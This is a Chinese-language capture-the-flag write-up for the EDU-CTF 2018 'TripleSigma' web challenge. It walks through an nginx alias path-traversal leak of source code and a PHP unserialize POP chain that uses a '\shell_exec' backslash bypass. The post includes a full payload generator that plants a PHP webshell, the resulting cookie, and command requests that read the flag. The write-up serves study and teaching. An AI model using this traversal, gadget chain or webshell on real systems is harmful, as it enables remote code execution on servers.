---
uuid: 9aeb46bc
title: EDU-CTF 2018 - TripleSigma
tags:
  - writeup 
  - web
  - php
categories:
  - Capture The Flag
  - EDU-CTF 2018
date: 2019-02-02 00:00:00
updated: 2019-02-02 00:00:00
---

這題包含很多知識，在做的時候查很多資料而收穫良多，從 nginx 漏洞到 PHP POP 都有。推薦大家先自己做做看！因為很有趣，從 22:00 解到 07:00 ...

<!--more-->

# [正文]

先觀察頁面有沒有漏洞，初步觀察後發現是用 nginx 架設，有 static 子目錄，推測有 nginx 路徑漏洞，網址輸入：`http://final.kaibro.tw:10004/static../`，成功拿到 source code。

{% note info %}
### Nginx 目錄穿越漏洞

常見於 Nginx 做 Reverse Proxy 的狀況，例如 config 設置 `location /files { alias /home/ }`
會因為 `/files` 沒有加上結尾 `/` ，而 `/home/` 有，所以 `/files../` 可以訪問上層目錄
{% endnote %}

{% codeblock lang:plain line_number:false %}
site
├── static
│   ├── ...
│   └── js
│       └── k.js
├── lib
│   ├── class_articlebody.php
│   ├── class_article.php
│   ├── class_avatar.php
│   ├── class_cookie.php
│   ├── class_debug.php
│   ├── class_filemanager.php
│   ├── class_oldfm.php
│   ├── class_user.php
│   ├── ...
├── avatar.php
├── blog.php
├── footer.php
├── header.php
├── index.php
├── joinus.php
├── login.php
├── logout.php
├── register.php
├── team.php
└── user.php
{% endcodeblock %}

`class_oldfm.php` 很坑，裡面滿滿的漏洞，但是沒有被引用 QQ，另外 `k.js` 的內容是 Konami Code ( ⇧⇧⇩⇩⇦⇨⇦⇨ⒷⒶ ) 的梗，輸入後會在 console 印奇怪的訊息

## Analysis

首先可以發現在 class_user.php 裡可以找到 username 和 password，先登入看看，可以發現 blog 頁面可以留言了。不知道能幹麻，先放著。先搜尋可能有漏洞的函式：

### file_get_contents 和 file_put_contents
1. 發現 OldFileManager 可以用，但是 trace 一下發現他根本沒有被 include..
2. 參數都不可控制，死路。

### unserialize
1. 發現在 `class_cookie.php` 的 `MyCookie::__construct()` 有 `unserialize()`，參數可以藉由 `$_cookie["e"]` 來控制
  {% codeblock class_cookie.php lang:php line_number:true first_line:7 %}
  $enc = $_COOKIE['e'];
  $dec = base64_decode(strrev($enc));
  $arr = explode("|", $dec); // 可以構造成 “1234|payload”
  {% endcodeblock %}

2. unserialize 後的 object 會 assign 給 `$this->article`
  {% codeblock class_cookie.php lang:php line_number:true first_line:23 %}
  if(count($arr) === 2) {
      $this->uid = $arr[0];
      $obj = unserialize($arr[1]);
      $this->article = $obj;
  }
  {% endcodeblock %}

3. 在 `blog.php` 發現它 `new MyCookie()` 後使用 `MyCookie::restore()`
  {% codeblock blog.php lang:php line_number:true first_line:64 %}
  if(isset($_COOKIE['e'])) {
      $myck = new MyCookie();
      $r = $myck->restore();
  } else {
      $r = NULL;
  }
  {% endcodeblock %}

4. 回到 `class_cookie.php` 查看，可以發現 `MyCookie::restore()` 回傳的就是可以控制的 `$this->article`，表示我們也能夠控制 `blog.php` 的 `$r`
  {% codeblock class_cookie.php lang:php line_number:true first_line:36 %}
  public function restore() {
      if($this->uid !== NULL && $this->article !== NULL)
          return $this->article; 
      else
          return NULL;
  }
  {% endcodeblock %}

5. 在 `blog.php` 裡面繼續往下發現 `$r` 會被丟進 `print_title($r)` 和 `print_content($r)`，這兩個都會 `echo $r->body->title`，找找看其他 class 有沒有好用的 `__toString` 可以用
  {% codeblock blog.php lang:php line_number:true first_line:99 %}
  function print_title($r) {
      if(isset($r)) {
          echo $r->body->title;
      }
  }

  function print_content($r) {
      if(isset($r)) {
          echo $r->body->content;
      }
  }
  {% endcodeblock %}

6. 不難發現只有 `class_debug.php` 的 `Debug::__toString()` 能夠使用，其他的都沒有在額外 call function，找找看其他 class 有沒有好用的 `save()` 可以用
  {% codeblock class_debug.php lang:php line_number:true first_line:12 %}
  function __toString() {
      $str = "[DEUBG]" . $msg;
      $this->fm->save(); 
      return $str;
  }
  {% endcodeblock %}

7. 在 `class_filemanager.php`, `class_article.php`, `class_user.php` 都有發現`save()`
  * `class_filemanager.php`, `class_article.php` 的 `save()`，雖然都有 `file_put_contents`，但參數都不可控，死路。
  * 剩下 `class_user.php` 的 `save()`，可以發現 `($this->func)($this->data)` 且 `$this->func` 和`$this->data` 都可以透過 `unserialize()` 的時候就控制到！
  {% codeblock class_user.php lang:php line_number:true first_line:41 %}
  public function save() {
      if(!isset($this->data))
          $this->data = User::getAllUser();

      if(preg_match("/^[a-z]/is", $this->func)) {
          if($this->func === "shell_exec") {
              ($this->func)("echo " . escapeshellarg($this->data) . " > /tmp/result");
          } 
      } else {
          ($this->func)($this->data);
      }
  }
  {% endcodeblock %}

8. 剩下如何 bypass `preg_match("/^[a-z]/is", $this->func)`，找了一些資料後後發現加入反斜線可以成功 bypass: `$func = '\shell_exec'`。

  {% note info %}
  ### PHP Global space
  在 PHP ( >= 5.3.0, 7) 中在名稱前加上前綴 `\` 表示該名稱是全局空間中的名稱，是合法的 syntax。
  {% endnote %}

9. 整個 POPchain：Article.body -> ArticleBody.content -> Debug.__toString() -> User.save()

## Create payload

1. 因為他是直接 `($this->func)($this->data)` 不會 echo 出來，所以必須想辦法找到可讀寫的地方，在 `class_article.php` 下發現 `/var/www/app/articles/` 這個路徑，看起來可讀寫，建立 webshell payload：`$data = 'echo \'<?=shell_exec($_GET[0]);?>\' >/var/www/app/articles/<name>.php'`

  {% codeblock payload.php lang:php line_number:true %}
  <?php
  include("lib/class_article.php");
  include("lib/class_articlebody.php");
  include("lib/class_cookie.php");
  include("lib/class_user.php");
  include("lib/class_debug.php");
  include("lib/class_filemanager.php");


  $title = "title";
  $content = new Debug("content");
  $content->fm = new User();
  $content->fm->func = "\shell_exec";
  $content->fm->data = "echo \'<?=shell_exec($_GET[0]);?>\' >/var/www/app/articles/VHJpcGxlIFNpZ21hIH.php";

  $article = new Article( $title, $content );
  $article->author = "article";

  echo strrev( base64_encode( "1234|" . serialize( $article ) ) );
  {% endcodeblock %}

## Get shell

1. 執行 `php payload.php` 後得到的 payload 丟進 `cookie[e]`，重整後到 webshell 的頁面。
  {% codeblock lang:shell line_number:false  %}
  $ php payload.php
  =0Xf913OiAHaw5CaFlmYxo1RJBjVul1ZR12Yoh2RJZnTIlEaxIjWw5kRJ ...
  {% endcodeblock %}

  {% codeblock Http request lang:plain line_number:false  %}
  http://final.kaibro.tw:10004/articles/VHJpcGxlIFNpZ21hIH.php
  GET 0=ls%20/                # 發現 _fl4g___yo, readflag
  GET 0=ls%20-al%20%2F        # 發現 _fl4g___yo 沒辦法 cat
  GET 0=/readflag             # 直接執行 readflag -> get flag
  {% endcodeblock %}

FLAG: `FLAG{b4d_ng1nx_4nd_l0000ng_p0p_cha1n}`
